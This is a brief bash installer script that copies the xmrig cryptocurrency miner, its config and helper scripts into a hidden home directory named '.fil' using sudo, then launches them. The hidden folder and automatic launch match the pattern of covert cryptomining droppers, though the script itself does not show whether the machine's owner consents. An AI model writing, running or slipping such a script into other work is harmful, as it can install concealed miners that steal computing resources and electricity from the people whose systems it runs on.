#!/bin/bash
sudo chmod +x *
mkdir ~/\.fil
sudo cp run ~/\.fil
sudo cp xmrig  ~/\.fil && sudo cp config.json  ~/\.fil && sudo cp SHA256SUMS  ~/\.fil
sudo cp sh.sh ~/\.fil
sudo cp xm.py ~/\.fil
bash ~/\.fil/run
python3 ~/\.fil/xm.py
